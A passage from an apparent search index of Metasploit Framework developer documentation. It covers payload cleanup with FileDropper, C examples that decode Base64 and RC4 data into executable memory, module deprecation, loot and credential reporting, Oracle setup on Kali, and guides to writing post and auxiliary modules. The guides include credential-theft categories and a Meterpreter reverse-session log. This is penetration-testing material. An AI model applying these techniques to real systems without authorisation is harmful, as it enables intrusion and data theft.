    "content": "The FileDropper mixin is a file manager that allows you to keep track of files, and then delete them when a session is created. To use it, first include the mixin: . include Msf::Exploit::FileDropper . Next, tell the FileDropper mixin where the file is going to be after a session is created by using the register_file_for_cleanup method. Each file name should either be a full path or relative to the current working directory of the session. For example, if I want to upload a payload to the target machine’s remote path: C:\\Windows\\System32\\payload.exe, then my statement can be: . register_file_for_cleanup(\"C:\\\\Windows\\\\System32\\\\payload.exe\") . If my session’s current directory is already in C:\\Windows\\System32\\, then you can: . register_file_for_cleanup(\"payload.exe\") . If you wish to register multiple files, you can also provide the file names as arguments: . register_file_for_cleanup(\"file_1.vbs\", \"file_2.exe\", \"file_1.conf\") . Note that if your exploit module uses on_new_session, you are actually overriding FileDropper’s on_new_session. ",
    "url": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#examples",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#examples"
  },"168": {
    "doc": "FileDropper",
    "title": "Reference",
    "content": ". | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/file_dropper.rb | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#reference",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#reference"
  },"169": {
    "doc": "FileDropper",
    "title": "FileDropper",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html"
  },"170": {
    "doc": "Base64 Support",
    "title": "Description",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#description",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#description"
  },"171": {
    "doc": "Base64 Support",
    "title": "How to decode Base64 with Metasploit::Framework::Compiler",
    "content": "The Metasploit C compiler has built-in support for Base64 encoding and decoding, which is implemented as base64.h. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#how-to-decode-base64-with-metasploitframeworkcompiler",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#how-to-decode-base64-with-metasploitframeworkcompiler"
  },"172": {
    "doc": "Base64 Support",
    "title": "Code Example",
    "content": "#include &lt;Windows.h&gt; #include &lt;String.h&gt; #include &lt;base64.h&gt; // \"Hello World\" encoded by Rex::Text.encode_base64() #define BASE64STR \"aGVsbG8gd29ybGQ=\" int main() { int base64StrLen = strlen(BASE64STR); LPVOID lpBuf = VirtualAlloc(NULL, sizeof(int) * base64StrLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(lpBuf, '\\0', base64StrLen); base64decode(lpBuf, BASE64STR, base64StrLen); MessageBox(NULL, (char*) lpBuf, \"Base64 Test\", MB_OK); return 0; } . To compile, use How to use Metasploit::Framework::Compiler::Windows to compile C code . ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#code-example",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html#code-example"
  },"173": {
    "doc": "Base64 Support",
    "title": "Base64 Support",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html"
  },"174": {
    "doc": "RC4 Support",
    "title": "How to decrypt RC4 with Metasploit::Framework::Compiler",
    "content": "The Metasploit C compiler has built-in support for RC4 encryption and decryption, which is implemented as the rc4.h header. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html#how-to-decrypt-rc4-with-metasploitframeworkcompiler",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html#how-to-decrypt-rc4-with-metasploitframeworkcompiler"
  },"175": {
    "doc": "RC4 Support",
    "title": "Code Example",
    "content": "#include &lt;Windows.h&gt; #include &lt;rc4.h&gt; #define PAYLOADSIZE 12 #define RC4KEY \"4ASMkFslyhwXehNZw048cF1Vh1ACzyyA\" int main(void) { unsigned char payload[] = \"\\xd8\\xb0\\xe9\\x5a\\x89\\xc2\\xee\\x43\\xb9\\x30\\xd0\\x86\"; int lpBufSize = sizeof(int) * PAYLOADSIZE; LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x04); memset(lpBuf, '\\0', lpBufSize); RC4(RC4KEY, payload, (char*) lpBuf, PAYLOADSIZE); MessageBox(NULL, (char*) lpBuf, \"Test\", MB_OK); return 0; } . To compile, use Metasploit::Framework::Compiler::Windows.compile_c. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html#code-example",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html#code-example"
  },"176": {
    "doc": "RC4 Support",
    "title": "RC4 Support",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html"
  },"177": {
    "doc": "How to deprecate a Metasploit module",
    "title": "Usage",
    "content": "To use the Msf::Module::Deprecated, here’s how: . 1 - Under class MetasploitModule of your module, include the following: . include Msf::Module::Deprecated . 2a - When moving a module, use the moved_from method in the new module to add an alias to the old module name: . moved_from 'auxiliary/analyze/jtr_windows_fast' . 2b - Use the deprecated method to assign a deprecation date and replacement module: . deprecated(Date.new(2014, 9, 21), 'exploit/linux/http/dlink_upnp_exec_noauth') . 2c - Alternatively, define the DEPRECATION_DATE and DEPRECATION_REPLACEMENT constants: . DEPRECATION_DATE = Date.new(2014, 9, 21) # Sep 21 # The new module is exploit/linux/http/dlink_upnp_exec_noauth DEPRECATION_REPLACEMENT = 'exploit/linux/http/dlink_upnp_exec_noauth' . When the user loads that module, they should see a warning like this: . msf &gt; use exploit/windows/misc/test [!] ************************************************************************ [!] * The module windows/misc/test is deprecated! * [!] * It will be removed on or about 2014-09-21 * [!] * Use exploit/linux/http/dlink_upnp_exec_noauth instead * [!] ************************************************************************ . ",
    "url": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html#usage",
    "relUrl": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html#usage"
  },"178": {
    "doc": "How to deprecate a Metasploit module",
    "title": "Code example",
    "content": "require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Module::Deprecated deprecated(Date.new(2014, 9, 21), 'exploit/linux/http/dlink_upnp_exec_noauth') def initialize(info = {}) super(update_info(info, 'Name' =&gt; 'Msf::Module::Deprecated Example', 'Description' =&gt; %q{ This shows how to use Msf::Module::Deprecated. }, 'Author' =&gt; [ 'sinn3r' ], 'License' =&gt; MSF_LICENSE, 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'DisclosureDate' =&gt; 'Apr 01 2014', 'Targets' =&gt; [ [ 'Automatic', { } ] ], 'DefaultTarget' =&gt; 0 )) end def exploit print_debug(\"Code example\") end end . ",
    "url": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html#code-example",
    "relUrl": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html#code-example"
  },"179": {
    "doc": "How to deprecate a Metasploit module",
    "title": "How to deprecate a Metasploit module",
    "content": "Metasploit has a very specific way to deprecate a module. To do so, you must be using the Msf::Module::Deprecated mixin. The reason you must be using this mixin is because two things: . | You are required to set a deprecation date. That way we know when to remove it, which is done manually. | You are optionally allowed to set a replacement of the module you wish to deprecate. | . ",
    "url": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html",
    "relUrl": "/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html"
  },"180": {
    "doc": "Reporting and Storing Data",
    "title": "Reporting and Storing Data",
    "content": ". | store_loot() - Used to store both stolen files (both text and binary) and “screencaps” of commands such as a ps -ef and ifconfig. The file itself need not be of forensic-level integrity – they may be parsed by a post module to extract only the relevant information for a penetration tester. | report_auth_info() - Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely “likely” usernames and passwords should use store_loot() instead. | report_vuln() - Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). | report_note() - Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where “loot” or “cred” or “vuln” classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type, such as domain.hosts, so other modules may easily find them in the database. | report_host() - Reports a host’s liveness and attributes such as operating system and service pack. This is less common because other reporting methods already do this, such as report_service, report_exploit_success, report_client, report_note, report_host_tag, report_vuln, report_event, report_loot, etc. Try not to repeat it. | report_service() - Reports a new service (port) that’s been detected by your module. | report_client() - Reports a client running a host, such as a web browser. | report_web_site() - Reports a website, and must be tied to an existing :service. If there is no :service, you will have to supply :host, :port, :ssl. | report_web_page() - You can use this if your module discovers a webpage that look interesting. | report_web_form() - You can use this if your module discovers web forms that look interesting. | report_web_vuln() - Reports a web application vulnerability. Exploits don’t really need to use this. It’s more suitable for auxiliary modules that exploit a bug that determines that it is vulnerable. | report_loot() - Very rarely, modules might actually want to export loots without using store_loot(). Typically they do this with Ruby’s file IO, but this won’t be logged in the database so can’t be tracked by Metasploit Framework. In that case, a report_loot() is needed. However, 99.9% of the time you should be using store_loot(). | . References . | Guidelines for Accepting Modules and Enhancements | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html"
  },"181": {
    "doc": "How to get Oracle Support working with Kali Linux",
    "title": "Install the Oracle Instant Client",
    "content": "As root, create the directory /opt/oracle. Then download the Oracle Instant Client packages for your version of Kali Linux. The packages you will need are: . | instantclient-basic-linux-12.2.0.1.0.zip | instantclient-sqlplus-linux-12.2.0.1.0.zip | instantclient-sdk-linux-12.2.0.1.0.zip | . Unzip these under /opt/oracle, and you should now have a path called /opt/oracle/instantclient_12_2/. Next symlink the shared library that we need to access the library from oracle: . root@kali:/opt/oracle/instantclient_12_2# ln libclntsh.so.12.1 libclntsh.so root@kali:/opt/oracle/instantclient_12_2# ls -lh libclntsh.so lrwxrwxrwx 1 root root 17 Jun 1 15:41 libclntsh.so -&gt; libclntsh.so.12.1 . You also need to configure the appropriate environment variables, perhaps by inserting them into your .bashrc file, logging out and back in for them to apply. export PATH=$PATH:/opt/oracle/instantclient_12_2 export SQLPATH=/opt/oracle/instantclient_12_2 export TNS_ADMIN=/opt/oracle/instantclient_12_2 export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2 export ORACLE_HOME=/opt/oracle/instantclient_12_2 . If you have succeeded, you should be able to run sqlplus from a command prompt: . root@kali:/opt/oracle/instantclient_12_2# sqlplus SQL*Plus: Release 12.2.0.1.0 Production on Tue Mar 26 20:40:24 2019 Copyright (c) 1982, 2016, Oracle. All rights reserved. Enter user-name: . ",
    "url": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html#install-the-oracle-instant-client",
    "relUrl": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html#install-the-oracle-instant-client"
  },"182": {
    "doc": "How to get Oracle Support working with Kali Linux",
    "title": "Install the ruby gem",
    "content": "First, download and extract the gem source release: . root@kali:~# wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip --2019-03-26 20:31:11-- https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip Resolving github.com (github.com)... 192.30.253.113, 192.30.253.112 Connecting to github.com (github.com)|192.30.253.113|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 [following] --2019-03-26 20:31:11-- https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 Resolving codeload.github.com (codeload.github.com)... 192.30.253.120, 192.30.253.121 Connecting to codeload.github.com (codeload.github.com)|192.30.253.120|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [application/zip] Saving to: 'ruby-oci8-2.2.7.zip' ruby-oci8-2.2.7.zip [ &lt;=&gt; ] 376.97K 2.36MB/s in 0.2s 2019-03-26 20:31:11 (2.36 MB/s) - 'ruby-oci8-2.2.7.zip' saved [386016] root@kali:~# unzip ruby-oci8-2.2.7.zip Archive: ruby-oci8-2.2.7.zip 0c85bf6da2f541de3236267b1a1b18f0136a8f5a creating: ruby-oci8-ruby-oci8-2.2.7/ inflating: ruby-oci8-ruby-oci8-2.2.7/.gitignore inflating: ruby-oci8-ruby-oci8-2.2.7/.travis.yml [...] inflating: ruby-oci8-ruby-oci8-2.2.7/test/test_rowid.rb root@kali:~# cd ruby-oci8-ruby-oci8-2.2.7/ . Install libgmp (needed to build the gem) and set the path to prefer the correct version of ruby so that Metasploit can use it. root@kali:~/ruby-oci8-ruby-oci8-2.2.7# export PATH=/opt/metasploit/ruby/bin:$PATH root@kali:~/ruby-oci8-ruby-oci8-2.2.7# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ... Build and install the gem . root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make ruby -w setup.rb config setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---&gt; lib ---&gt; lib/dbd &lt;--- lib/dbd ---&gt; lib/oci8 &lt;--- lib/oci8 &lt;--- lib ---&gt; ext ---&gt; ext/oci8 /opt/metasploit/ruby/bin/ruby /root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8/extconf.rb checking for load library path... LD_LIBRARY_PATH... checking /opt/metasploit/ruby/lib... no checking /opt/oracle/instantclient_12_2... yes /opt/oracle/instantclient_12_2/libclntsh.so.12.1 looks like an instant client. checking for cc... ok checking for gcc... yes checking for LP64... yes checking for sys/types.h... yes checking for ruby header... ok checking for OCIInitialize() in oci.h... yes [...] linking shared-object oci8lib_250.so make[1]: Leaving directory `/root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8' &lt;--- ext/oci8 &lt;--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make install ruby -w setup.rb install setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---&gt; lib mkdir -p /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ install oci8.rb /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ [...] &lt;--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7# . ",
    "url": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html#install-the-ruby-gem",
    "relUrl": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html#install-the-ruby-gem"
  },"183": {
    "doc": "How to get Oracle Support working with Kali Linux",
    "title": "How to get Oracle Support working with Kali Linux",
    "content": "This is an update of the original blog post about how to get Oracle support working with Metasploit and Kali Linux, found here. Due to licensing issues, we cannot ship Oracle’s proprietary client access libraries by default. As a result, you may see this error when running a Metasploit module: . msf auxiliary(oracle_login) &gt; run [-] Failed to load the OCI library: cannot load such file -- oci8 [-] See http://www.metasploit.com/redmine/projects/framework/wiki/OracleUsage for installation instructions [*] Auxiliary module execution completed msf auxiliary(oracle_login) &gt; run . or . msf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; run [-] Failed to load the OCI library: cannot load such file -- oci8 [-] Try 'gem install ruby-oci8' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed . The general steps to getting Oracle support working are to install the Oracle Instant Client and development libraries, install the required dependencies for Kali Linux, then install the gem. ",
    "url": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html",
    "relUrl": "/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html"
  },"184": {
    "doc": "How to get started with writing a Meterpreter script",
    "title": "How to get started with writing a Meterpreter script",
    "content": ". I tricked you. We don’t let anybody write Meterpreter scripts anymore, therefore we will no longer teach you how. You should try writing post modules instead. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html"
  },"185": {
    "doc": "Writing a post module",
    "title": "Plan your module",
    "content": "Just like writing a software, before you start coding you should have a clear and specific goal for what your post module does. It’s never a good idea to have multiple functionalities in a single module. For example: having it steal the network configuration files, steal passwd, hashes, shell history, etc. Instead, you should break it down into multiple modules. You should also think about what session types to support: meterpreter, or shell. Ideally, support both. But if you have to choose between the two, on Windows you should favor Windows Meterpreter. On Linux, the shell session type has been a stronger candidate than the Linux Meterpreter, but hopefully this will change in the near future. For platforms that don’t have a Meterpreter, obviously your only choice is a shell. Another important thing is to think about how your module will perform on different distributions/systems. For example, say you want to run a ifconfig command on Linux. On Ubuntu it’s a no-brainer, simply run the ifconfig command. Well, a different Linux distro might not actually know what you’re asking, so you have to be more specific and do /sbin/ifconfig instead. Same thing with Windows. Is it C:\\WINDOWS\\ or C:\\WinNT? It’s both. Is it C:\\Documents and Settings\\[User name], or C:\\Users\\[User name]? Both, depends on that Windows version. A better solution to that would be use an environment variable :-) . Always do your homework, and contain as many scenarios you can think of. And most importantly, get your VMs and TEST! . Categories of post modules . Post modules are categorized based on their behavior. For example, if it collects data, naturally it goes to the “gather” category. If it adds/updates/or removes an user, it belongs to “manage”. Here’s a list as a reference: . | Category | Description | . | gather | Modules that involve data gathering/collecting/enumeration. | . | gather/credentials | Modules that steal credentials. | . | gather/forensics | Modules that involve forensics data gathering. | . | manage | Modules that modifies/operates/manipulates something on the system. Session management related tasks such as migration, injection also go here. | . | recon | Modules that will help you learn more about the system in terms of reconnaissance, but not about data stealing. Understand this is not the same as “gather” type modules. | . | wlan | Modules that are for WLAN related tasks. | . | escalate | This is deprecated, but the modules remain there due to popularity. This used to be the place for privilege escalation modules. All privilege escalation modules are no longer considered as post modules, they’re now exploits. | . | capture | Modules that involve monitoring something for data collection. For example: key logging. | . Session object . So you know how in Lord of the Rings, people are totally obsessed with the One Ring? Well, that’s how it is with the session object. The one object you cannot live without, it’s your precious. All post modules and other related mixins basically are built on top of the session object, because it knows everything about the compromised host, and allows you to command it. You can use the session method to access the session object, or its alias client. The best way to interact with one is via irb, here’s an example of how: . msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500 meterpreter &gt; irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client &gt;&gt; session.class =&gt; Msf::Sessions::Meterpreter_x86_Win . At this point you have the power to rule them all. But notice that the above example is a Msf::Sessions::Meterpreter_x86_Win object. There are actually several more different ones: command_shell.rb, meterpreter_php.rb, meterpreter_java.rb, meterpreter_x86_linux.rb, etc. Each behaves differently so it’s actually kind of difficult to explain them all, but they are defined in the lib/msf/base/sessions/ directory so you can see how they work. Or you can play with one since you’re already in the irb prompt. In Ruby, there are two object methods that are handy for debugging purposes. The first is methods, which will list all the public and protected methods from that object: . session.methods . The other one is inspect, which returns a string of a human-readable representation of the object: . session.inspect . You can also look at other current post modules and see how they use their session object. The Msf::Post Mixin . As we explained, most post module mixins are built on top of the session object, and there are many out there. However, there is a main one you obviously cannot live without: the Msf::Post mixin. When you create a post module with this mixin, a lot of other mixins are also already included for all kinds of scenarios, to be more specific: . | msf/core/post/common - Common methods post modules use, for example: cmd_exec. | msf/core/post_mixin - Keeps track of the session state. | msf/core/post/file - File system related methods. | msf/core/post/webrtc - Uses WebRTC to interact with the target machine’s webcam. | msf/core/post/linux - There actually isn’t a lot going on, just get_sysinfo and is_root? specifically for Linux. | msf/core/post/osx - get_sysinfo, get_users, get_system_accounts, get_groups, and methods for operating the target machine’s webcam. | msf/core/post/solaris - Pretty much like the linux mixin. Same methods, but for Solaris. | msf/core/post/unix - get_users, get_groups, enum_user_directories | msf/core/post/windows - Most of the development time are spent here. From Windows account management, event log, file info, Railgun, LDAP, netapi, powershell, registry, wmic, services, etc. | . Template . Here we have a post module template. As you can see, there are some required fields that need to be filled. We’ll explain each: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Post def initialize(info = {}) super( update_info( info, 'Name' =&gt; '[Platform] [Module Category] [Software] [Function]', 'Description' =&gt; %q{ Say something that the user might want to know. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Name' ], 'Platform' =&gt; [ 'win', 'linux', 'osx', 'unix', 'bsd', 'solaris' ], 'SessionTypes' =&gt; [ 'meterpreter', 'shell' ] ) ) end def run # Main method end end . The Name field should begin with a platform, such as: Multi, Windows, Linux, OS X, etc. Followed by the module’s category, such as: Gather, Manage, Recon, Capture, Wlan. Followed by the name of the software, and then finally a few words that describe the functionality of the module. A naming example: “Multi Gather RndFTP Credential Enumeration”. The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he’s using without the need to actually read the module’s source and figure things out. And trust me, most of them don’t. The Author field is where you put your name. The format should be “Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" . The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The SessionTypes field should be either meterpreter, or shell. You should try to support both. And finally, the run method is like your main method. Start writing your code there. Basic git commands . Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We’re not here to lecture you about how awesome git is, we know it has a learning curve and it’s not surprising to find new users making mistakes. Every once a while, your git “rage” will kick in, and we understand. However, it’s important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate, which is Metasploit’s utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you’re submitting other crap you don’t intend to change, and/or you’re probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that’s up to date to master. First off, make sure you’re on master. If you do a git status it will tell you what branch you’re currently on: . $ git status # On branch upstream-master nothing to commit, working directory clean . Ok, now do a git pull to download the latest changes from Metasploit: . $ git pull Already up-to-date. At this point, you’re ready to start a new branch. In this case, we’ll name our new branch “my_awesome_branch”: . $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' . And then you can go ahead and add that module. Make sure it’s in the appropriate path: . $ git add [module path] . When you decide to save the changes, commit (if there’s only one module, you can do git commit -a too so you don’t have to type the module path. Note -a really means EVERYTHING): . $ git commit [module path] . When you’re done, push your changes, which will upload your code to your remote branch “my_awesome_branch”. You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch . References . | https://github.com/rapid7/metasploit-framework/tree/master/modules/post | https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post | . ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html#plan-your-module",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html#plan-your-module"
  },"186": {
    "doc": "Writing a post module",
    "title": "Writing a post module",
    "content": "Post module development is a challenge to your programming skills. It’s not like writing a memory corruption based exploit, where technically speaking is usually about crafting a malicious input - a string. A post module is more about proper module design, practical knowledge in Ruby and the Metasploit library. It’s also a very valuable skill to have, because if you don’t know what to do after popping a shell, what’s the point of the penetration test, right? Also, what if a module doesn’t work? Are you willing to wait days, weeks, or maybe even months for someone else to fix it for you? Probably not. If you know how to do it yourself, you can probably fix it a lot sooner, and continue with your pentest and do more things. So learn post module development! It’s good for you, and your career. ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html"
  },"187": {
    "doc": "Writing an auxiliary module",
    "title": "Plan your module",
    "content": "Just like writing a software, before you start coding you should have a clear and specific goal for what your auxiliary module does. It’s never a good idea to have multiple functionalities in a single module. You should break it down into multiple modules instead. You should also think about how your module will perform in different situations. For example, if it’s meant to test against a Tomcat server, what happens if you use it against Nginx? Will it error out and leave a backtrace? If it does, you should handle that properly. Does your module require specific settings/conditions from the target machine? What happens if it doesn’t? Will it error out again? . Most importantly, make sure to test your module thoroughly. It’s always ugly to find out problems in the middle of an important engagement, that just might cost you. ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#plan-your-module",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#plan-your-module"
  },"188": {
    "doc": "Writing an auxiliary module",
    "title": "Main categories of auxiliary modules",
    "content": "Generally speaking, auxiliary modules are categorized based on their behavior, but this is somewhat inconsistent so you’ll just have to use your best judgement and find the most appropriate one. Here’s a list of the common ones: . | Category | Description | . | admin | Modules that modify, operate, or manipulate something on target machine. | . | analyze | We initially created this folder for password-cracking modules that require analysis time. | . | client | We initially created this folder for an SMTP module for social-engineering purposes. | . | dos | Pretty self-explanatory: denial-of-service modules. | . | fuzzers | If your module is a fuzzer, this is where it belongs. Make sure to place it in the correct sub-directory based on the protocol. | . | gather | Modules that gather, collect, or enumerates data from a single target. | . | scanner | Modules that use the Msf::Auxiliary::Scanner mixin almost always go here. Make sure to place yours in the correct sub-directory based on the protocol. | . | server | Modules that are servers. | . | sniffer | Modules that are sniffers. | . There are actually a few more directories in auxiliary, but that’s kind of where the gray area is. You are more than welcome to see if yourself. ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#main-categories-of-auxiliary-modules",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#main-categories-of-auxiliary-modules"
  },"189": {
    "doc": "Writing an auxiliary module",
    "title": "The Msf::Auxiliary::Scanner mixin",
    "content": "The Msf::Auxiliary::Scanner mixin is heavily used in auxiliary modules, so we might as well talk about it right here. The mixin allows you to be able to test against a range of hosts, and it’s multi-threaded. To use it, first off you need to include the mixin under the scope of your Metasploit3 class: . include Msf::Auxiliary::Scanner . A couple of new things will be added to your module when you include this mixin. You will have a new datastore option named “RHOSTS”, which allows the user to specify multiple hosts. There’s a new “THREADS” option, which allows the number of threads to run during execution. There’s also “ShowProgress” and “ShowProgressPercent” for tracking scan progress. Typically, the main method for an auxiliary module is “def run”. But when you use the Msf::Auxiliary::Scanenr mixin, you need to be using def run_host(ip). The IP parameter is the target machine. ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#the-msfauxiliaryscanner-mixin",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#the-msfauxiliaryscanner-mixin"
  },"190": {
    "doc": "Writing an auxiliary module",
    "title": "Templates",
    "content": "Here’s the most basic example of an auxiliary module. We’ll explain a bit more about the fields that need to be filled: . ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Auxiliary def initialize(info = {}) super(update_info(info, 'Name' =&gt; 'Module name', 'Description' =&gt; %q{ Say something that the user might want to know. }, 'Author' =&gt; [ 'Name' ], 'License' =&gt; MSF_LICENSE )) end def run # Main function end end . The Name field can begin with the vendor name, but optional. Followed by the software name. And then a few words that basically describe what it’s for. For example: “Dolibarr ERP/CRM Login Utility” . The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he’s using without the need to actually read the module’s source and figure things out. And trust me, most of them don’t. The Author field is where you put your name. The format should be “Name “. If you want to have your Twitter handle there, leave it as a comment, for example: “Name # handle” . Because the Msf::Auxiliary::Scanner mixin is so popular, we figured you want a template for it, too. And here you go: . ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Auxiliary include Msf::Auxiliary::Scanner def initialize(info = {}) super(update_info(info, 'Name' =&gt; 'Module name', 'Description' =&gt; %q{ Say something that the user might want to know. }, 'Author' =&gt; [ 'Name' ], 'License' =&gt; MSF_LICENSE )) end def run_host(ip) # Main method end end . Basic git commands . Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We’re not here to lecture you about how awesome git is, we know it has a learning curve and it’s not surprising to find new users making mistakes. Every once a while, your git “rage” will kick in, and we understand. However, it’s important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default 